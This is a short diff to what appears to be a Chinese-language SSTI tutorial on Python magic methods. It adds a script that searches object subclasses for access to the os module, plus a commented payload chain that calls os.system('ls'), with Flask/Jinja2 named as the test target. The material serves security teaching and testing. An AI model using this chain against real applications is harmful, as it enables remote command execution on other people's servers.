@@ -220,6 +220,23 @@ python的几个魔术方法
 * `__init__`  类的初始化方法
 * `__globals__`  保存了函数所有的所有全局变量，在利用中，可以使用 `__init__` 获取对象的函数，并通过 `__globals__` 获取 file、os 等模块以进行下一步的利用
 
+**查找可用的payload**
+
+```python
+index = 0
+for item in ''.__class__.__mro__[-1].__subclasses__():
+    try:
+        if 'os' in item.__init__.__globals__:
+            print(index, item)
+        index += 1
+    except:
+        index += 1
+# 396 <class 'http.cookiejar.Cookie'>
+# 399 <class 'http.cookiejar.CookieJar'>
+
+# ''.__class__.__mro__[-1].__subclasses__()[396].__init__.__globals__['os'].system('ls')
+```
+
 **测试用例**
 
 Flask/Jinja2
